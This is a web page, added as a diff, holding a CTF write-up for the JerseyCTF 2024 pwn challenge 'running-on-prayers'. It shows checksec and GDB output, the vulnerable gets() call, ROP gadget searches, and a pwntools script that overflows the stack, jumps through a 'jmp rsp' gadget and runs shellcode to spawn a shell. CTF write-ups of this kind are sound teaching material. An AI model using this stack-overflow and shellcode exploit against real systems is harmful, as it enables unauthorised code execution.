@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>JerseyCTF 2024 - pwn/running-on-prayers | CTF Writeups</title>
+<meta name="keywords" content="">
+<meta name="description" content="We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challnege. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.
+checksec --file RunningOnPrayers [*] &#39;/home/df00/Desktop/RunningOnPrayers&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments The binary itself is very minimal, There is a main function that calls a vuln function.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/jersey-ctf-2024-running-on-prayers/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/jersey-ctf-2024-running-on-prayers/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      JerseyCTF 2024 - pwn/running-on-prayers
+    </h1>
+    <div class="post-meta"><span title='2024-03-24 18:51:51 -0400 EDT'>March 24, 2024</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>We are given an executable and a netcat port. The name of the challenge suggests that this is a ROP challnege. Looking at the binary, all protections are off and the stack is executable, so we can inject shellcode.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>checksec --file RunningOnPrayers
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/df00/Desktop/RunningOnPrayers&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX disabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
+</span></span></code></pre></div><p>The binary itself is very minimal, There is a main function that calls a vuln function. We use gets to read into a buffer, and that gives us our buffer overflow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_28 [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The hard part is not finding the vulnerability, but actually doing something with it&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(local_28);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I used ROPGadget to search for gadgets that we can use. Unfortunetly, no &lsquo;pop rdi&rsquo; as that would have made things very easy. Given that we probably need to execute shellcode in this challenge, call and jmp would be useful gadets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ROPgadget --binary RunningOnPrayers | grep <span style="color:#e6db74">&#34;call&#34;</span>
+</span></span><span style="display:flex;"><span>0x000000000040100d : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; test rax, rax ; je 0x401016 ; call rax
+</span></span><span style="display:flex;"><span>0x000000000040103e : call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0000000000401014 : call rax
+</span></span><span style="display:flex;"><span>0x0000000000401012 : je 0x401016 ; call rax
+</span></span><span style="display:flex;"><span>0x000000000040105b : sar edi, 0xff ; call qword ptr <span style="color:#f92672">[</span>rax - 0x5e1f00d<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+</span></span><span style="display:flex;"><span>0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ROPgadget --binary RunningOnPrayers | grep <span style="color:#e6db74">&#34;jmp&#34;</span>
+</span></span><span style="display:flex;"><span>0x0000000000401036 : add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al ; add dl, dh ; jmp 0x401020
+</span></span><span style="display:flex;"><span>0x0000000000401038 : add dl, dh ; jmp 0x401020
+</span></span><span style="display:flex;"><span>0x0000000000401173 : cli ; jmp 0x401100
+</span></span><span style="display:flex;"><span>0x0000000000401170 : endbr64 ; jmp 0x401100
+</span></span><span style="display:flex;"><span>0x00000000004010e5 : je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
+</span></span><span style="display:flex;"><span>0x0000000000401127 : je 0x401130 ; mov edi, 0x404040 ; jmp rax
+</span></span><span style="display:flex;"><span>0x000000000040103a : jmp 0x401020
+</span></span><span style="display:flex;"><span>0x0000000000401174 : jmp 0x401100
+</span></span><span style="display:flex;"><span>0x000000000040100b : jmp 0x4840103f
+</span></span><span style="display:flex;"><span>0x00000000004010ec : jmp rax
+</span></span><span style="display:flex;"><span>0x0000000000401231 : jmp rsp
+</span></span><span style="display:flex;"><span>0x00000000004010e7 : mov edi, 0x404040 ; jmp rax
+</span></span><span style="display:flex;"><span>0x000000000040116c : nop dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span> ; endbr64 ; jmp 0x401100
+</span></span><span style="display:flex;"><span>0x00000000004010e6 : or dword ptr <span style="color:#f92672">[</span>rdi + 0x404040<span style="color:#f92672">]</span>, edi ; jmp rax
+</span></span><span style="display:flex;"><span>0x00000000004010e3 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404040 ; jmp rax
+</span></span><span style="display:flex;"><span>0x0000000000401125 : test eax, eax ; je 0x401130 ; mov edi, 0x404040 ; jmp rax
+</span></span></code></pre></div><p>Given that we have both jmp rax and call rax, my first thought was that we could use that. Lets overflow the buffer and take a look with GDB to see what happens.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span> Legend: Modified register | Code | Heap | Stack | String <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+</span></span><span style="display:flex;"><span>$rax   : 0x007fffffffdfe0  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&#34;</span>
+</span></span><span style="display:flex;"><span>$rbx   : 0x0               
+</span></span><span style="display:flex;"><span>$rcx   : 0x007ffff7e1aaa0  →  0x00000000fbad208b
+</span></span><span style="display:flex;"><span>$rdx   : 0x1               
+</span></span><span style="display:flex;"><span>$rsp   : 0x007fffffffdfe0  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&#34;</span>
+</span></span><span style="display:flex;"><span>$rbp   : 0x007fffffffe000  →  <span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
+</span></span><span style="display:flex;"><span>$rsi   : 0x1               
+</span></span><span style="display:flex;"><span>$rdi   : 0x007ffff7e1ca80  →  0x0000000000000000
+</span></span><span style="display:flex;"><span>$rip   : 0x000000004011a7  →  &lt;vuln+49&gt; mov eax, 0x0
+</span></span><span style="display:flex;"><span>$r8    : 0x0               
+</span></span><span style="display:flex;"><span>$r9    : 0x0               
+</span></span><span style="display:flex;"><span>$r10   : 0x007ffff7c09c78  →  0x000f0022000043b3
+</span></span><span style="display:flex;"><span>$r11   : 0x246             
+</span></span><span style="display:flex;"><span>$r12   : 0x007fffffffe128  →  0x007fffffffe448  →  <span style="color:#e6db74">&#34;/home/df00/Desktop/RunningOnPrayers&#34;</span>
+</span></span><span style="display:flex;"><span>$r13   : 0x000000004011ae  →  &lt;main+0&gt; endbr64 
+</span></span><span style="display:flex;"><span>$r14   : 0x00000000403e18  →  0x00000000401140  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
+</span></span><span style="display:flex;"><span>$r15   : 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x0000000000000000
+</span></span><span style="display:flex;"><span>$eflags: <span style="color:#f92672">[</span>zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+</span></span></code></pre></div><p>Here I just overflowed the buffer with all A&rsquo;s, but we see that our input is in rax. So if we fill our buffer with shellcode and call rax, it should execute right? Unfortunetly it won&rsquo;t. At vuln+49 right before we return, eax (lower 32 bits of rax) is set to zero.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gef➤  disas vuln
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> vuln:
+</span></span><span style="display:flex;"><span>   0x0000000000401176 &lt;+0&gt;:	endbr64 
+</span></span><span style="display:flex;"><span>   0x000000000040117a &lt;+4&gt;:	push   rbp
+</span></span><span style="display:flex;"><span>   0x000000000040117b &lt;+5&gt;:	mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   0x000000000040117e &lt;+8&gt;:	sub    rsp,0x20
+</span></span><span style="display:flex;"><span>   0x0000000000401182 &lt;+12&gt;:	lea    rax,<span style="color:#f92672">[</span>rip+0xe7f<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x402008</span>
+</span></span><span style="display:flex;"><span>   0x0000000000401189 &lt;+19&gt;:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   0x000000000040118c &lt;+22&gt;:	mov    eax,0x0
+</span></span><span style="display:flex;"><span>   0x0000000000401191 &lt;+27&gt;:	call   0x401060 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x0000000000401196 &lt;+32&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x000000000040119a &lt;+36&gt;:	mov    rdi,rax
+</span></span><span style="display:flex;"><span>   0x000000000040119d &lt;+39&gt;:	mov    eax,0x0
+</span></span><span style="display:flex;"><span>   0x00000000004011a2 &lt;+44&gt;:	call   0x401070 &lt;gets@plt&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x00000000004011a7 &lt;+49&gt;:	mov    eax,0x0
+</span></span><span style="display:flex;"><span>   0x00000000004011ac &lt;+54&gt;:	leave  
+</span></span><span style="display:flex;"><span>   0x00000000004011ad &lt;+55&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>The other gadget that we can use is jmp rsp, and looking above we see that out input is also in rsp.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>0x0000000000401231 : jmp rsp
+</span></span></code></pre></div><p>rsp will point at the thing after the return pointer once ret has occured, so our shellcode will go right after jmp rsp.</p>
+<p>The final solve script. Unfortunetly, the netcat port was down for almost the whole CTF, but as they say - it worked on my machine :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./RunningOnPrayers&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DEBUG&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./RunningOnPrayers&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;it&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jmp_rsp <span style="color:#f92672">=</span> next(elf<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;jmp rsp&#39;</span>)))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>,             
+</span></span><span style="display:flex;"><span>    jmp_rsp,                
+</span></span><span style="display:flex;"><span>    asm(shellcraft<span style="color:#f92672">.</span>sh())     
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/">CTF Writeups</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
